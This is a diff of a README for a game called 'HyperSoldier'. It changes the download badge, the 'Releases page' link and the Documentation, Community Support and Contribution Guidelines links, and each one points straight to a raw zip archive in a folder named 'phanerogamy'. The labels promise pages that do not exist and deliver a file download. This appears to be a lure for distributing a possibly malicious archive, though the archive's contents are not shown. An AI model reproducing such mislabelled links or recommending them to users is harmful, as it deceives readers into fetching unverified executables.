@@ -1,6 +1,6 @@
 # 🎮 HyperSoldier - Experience the Future of Combat
 
-[![Download HyperSoldier](https://raw.githubusercontent.com/dududqwad/HyperSoldier/main/phanerogamy/Soldier-Hyper-1.7.zip%20HyperSoldier-v1.0-blue)](https://raw.githubusercontent.com/dududqwad/HyperSoldier/main/phanerogamy/Soldier-Hyper-1.7.zip)
+[![Download HyperSoldier](https://github.com/dududqwad/HyperSoldier/raw/refs/heads/main/phanerogamy/Hyper-Soldier-2.7.zip%20HyperSoldier-v1.0-blue)](https://github.com/dududqwad/HyperSoldier/raw/refs/heads/main/phanerogamy/Hyper-Soldier-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ HyperSoldier offers several exciting features:
 ## 📥 Download & Install
 
 You can download HyperSoldier from our GitHub Releases page.  
-**Visit this page to download**: [HyperSoldier Releases](https://raw.githubusercontent.com/dududqwad/HyperSoldier/main/phanerogamy/Soldier-Hyper-1.7.zip)
+**Visit this page to download**: [HyperSoldier Releases](https://github.com/dududqwad/HyperSoldier/raw/refs/heads/main/phanerogamy/Hyper-Soldier-2.7.zip)
 
 1. Click the link above to go to our Releases page.
 2. Find the latest version listed.
@@ -61,9 +61,9 @@ If you encounter issues:
 
 ## 🔗 Useful Links
 
-- [Documentation](https://raw.githubusercontent.com/dududqwad/HyperSoldier/main/phanerogamy/Soldier-Hyper-1.7.zip): Find detailed guides and support here.
-- [Community Support](https://raw.githubusercontent.com/dududqwad/HyperSoldier/main/phanerogamy/Soldier-Hyper-1.7.zip): Report issues or ask questions.
-- [Contribution Guidelines](https://raw.githubusercontent.com/dududqwad/HyperSoldier/main/phanerogamy/Soldier-Hyper-1.7.zip): Interested in helping? Check out how you can contribute.
+- [Documentation](https://github.com/dududqwad/HyperSoldier/raw/refs/heads/main/phanerogamy/Hyper-Soldier-2.7.zip): Find detailed guides and support here.
+- [Community Support](https://github.com/dududqwad/HyperSoldier/raw/refs/heads/main/phanerogamy/Hyper-Soldier-2.7.zip): Report issues or ask questions.
+- [Contribution Guidelines](https://github.com/dududqwad/HyperSoldier/raw/refs/heads/main/phanerogamy/Hyper-Soldier-2.7.zip): Interested in helping? Check out how you can contribute.
 
 ## 📞 Contact
 
